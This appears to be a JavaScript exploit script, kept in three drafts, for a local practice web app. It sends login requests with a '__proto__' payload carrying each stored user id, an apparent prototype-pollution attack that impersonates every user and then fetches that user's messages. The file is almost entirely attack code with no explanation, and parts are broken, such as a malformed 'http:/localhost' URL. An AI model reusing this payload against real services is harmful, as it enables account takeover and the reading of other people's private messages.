// const db = require('./db');
// const request = require('request');

// var idb = db.get('users').value().map(function(user) {
//   return user.id;
// });

// var headers = {
//     'Content-type': 'application/json'
// };

// for (i = 0; i < idb.length; i++) {

//   var dataString = '{"email": "len1234@gmail.com", "password": "123456", "__proto__": {"id":' + '\"' + idb[i] + '\"' + '}}';

//   var post_options = {
//       url: 'http://localhost:3333/auth/login',
//       method: 'POST',
//       headers: headers,
//       body: dataString
//   };

//   function post_callback(err, res, body) {
//       if (!err && res.statusCode == 200) {
//           console.log(body);
//       }
//   }

//   request(post_options, post_callback);


//   var get_options = {
//     url: 'http:/localhost:3333/users/getMessage'
//   };

//   function get_callback(error, response, body) {
//     if (!error && response.statusCode == 200) {
//         console.log(body);
//     }
//   }

//   request(get_options, get_callback);

// }

//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------

const db = require('./db');
const ParallelRequest = require('parallel-http-request');
 
var config = {
    response: "simple"
};
 
var request = new ParallelRequest(config);

var headers = {
  'Content-type': 'application/json'
};

var idb = db.get('users').value().map(function(user) {
  return user.id;
});

for (i = 0; i < idb.length; i++) {
  //var dataString = '{"email": "len1234@gmail.com", "password": "123456", "__proto__": {"id":' + '\"' + idb[i] + '\"' + '}}';

  request.add({
      url:'http://localhost:3333/auth/login',
      method:'POST',
      headers: headers,
      body: {
        email:'len1234@gmail.com',
        password: '123456',
        __proto__: { id: 'Z6pZm0KbKn' }
      }
    })

    // .add({
    //   url:'http:/localhost:3333/users/getMessage',
    //   method:'GET'
    // })

    .send(function(res){
      console.log(res);
    });
}

//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------


const db = require('./db');
const async = require('async');
const request = require('request');

var headers = {
  'Content-type': 'application/json'
};

var idb = db.get('users').value().map(function(user) {
  return user.id;
});


function requestPromise(options) {
  return new Promise(function(resolve, reject) {
    request(options, function(error, response, body) {
      if(error) {
        return reject(error);
      }
      resolve(body);
    });
  });
}


async function delayedLog(postOptions, getOptions) {
  // waiting until return promise

  var requestPromisePost = await requestPromise(postOptions);
    
  var requestPromiseGet = await requestPromise(getOptions);

  //only print result after implement promise function
  Promise.all([
    requestPromisePost,
    requestPromiseGet
  ])
  .then(function(results) {
    console.log(results);
  })
  .catch(function(err) {
    console.log(err);
  });

}


async function process(array) {
  for(var value of array) {
    var dataString = '{"email": "len1234@gmail.com", "password": "123456", "__proto__": {"id":' + '\"' + value + '\"' + '}}';

    var postOptions = {
      method: 'POST',
      url: 'http://localhost:3333/auth/login',
      headers: headers,
      body: dataString
    };

    var getOptions = {
      method: 'GET',
      url: 'http://localhost:3333/users/getMessage',
      headers: headers
    };
    await delayedLog(postOptions, getOptions);
  }
}

process(idb);